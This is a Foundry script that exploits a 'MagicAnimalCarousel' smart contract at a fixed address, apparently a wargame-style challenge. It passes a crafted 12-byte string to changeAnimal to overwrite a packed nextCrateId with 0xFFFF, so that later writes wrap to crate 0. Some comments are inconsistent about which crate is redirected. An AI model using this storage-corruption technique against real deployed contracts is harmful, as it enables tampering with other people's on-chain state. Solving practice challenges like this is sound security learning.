// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Script, console} from "forge-std/Script.sol";
import {MagicAnimalCarousel} from "../src/MagicAnimalCarousel.sol";

contract MagicAnimalCarouselAttack is Script {
    MagicAnimalCarousel carousel;

    function run() external {
        vm.startBroadcast();
        carousel = MagicAnimalCarousel(0x8cA782f47DdbFA3F955eC78B0042B412D5f66247);

        // Step 1: Add animal to the current crate (likely crate 1 initially)
        console.log("Adding 'Firulais' to the carousel...");
        carousel.setAnimalAndSpin("Firulais");

        console.log("Animal at crate 1 after setting Firulais: ");
        console.logBytes32(bytes32(carousel.carousel(1))); // Assuming first crate is 1
        console.log("Current crate ID: ", carousel.currentCrateId());

        // Step 2: Manipulate nextCrateId of the current crate
        // This specific string causes 0xFFFF to be written into the nextCrateId slot.
        // The string itself is "10000000000000000000" + "FFFF" (hex for 0xFFFF)
        // This is a 12-byte string: (10 bytes from hex"10...0") + (2 bytes from hex"FFFF") = 12 bytes
        string memory exploitString = string(abi.encodePacked(hex"10000000000000000000FFFF"));
        console.log("\nManipulating nextCrateId of crate %s with exploit string...", carousel.currentCrateId());
        carousel.changeAnimal(exploitString, carousel.currentCrateId()); // Target the crate

        console.log("Animal at crate %s after manipulating:", carousel.currentCrateId());
        console.logBytes32(bytes32(carousel.carousel(carousel.currentCrateId())));
        console.log("Current crate ID: ", carousel.currentCrateId()); // Still the same as before changeAnimal

        // Step 3: Add animal to the now-redirected crate
        // This call will write to crate ID 0 because the previous crate's nextCrateId was set to 65535 (MAX_CAPACITY - 1),
        // causing (65535 + 1) % MAX_CAPACITY = 0.
        // Using "Firulais" for the second animal as well
        console.log("\nAdding 'Firulais' to the now-redirected crate (should be crate 0)...");
        carousel.setAnimalAndSpin("Firulais");

        console.log("Animal at crate 1 after setting Firulais (initial):");
        console.logBytes32(bytes32(carousel.carousel(1)));
        console.log("Animal at crate 65535 (just before wrap-around) after manipulation:");
        console.logBytes32(bytes32(carousel.carousel(65535))); // This crate's next ID was redirected
        console.log("Animal at crate 0 (after wrap-around) after setting Firulais:");
        console.logBytes32(bytes32(carousel.carousel(0))); // This crate should now contain "Firulais"
        console.log("Current crate ID: ", carousel.currentCrateId()); // Should now be 0

        vm.stopBroadcast();
        console.log("\nCarousel loop successfully broken by redirecting to crate 0!");
    }
}
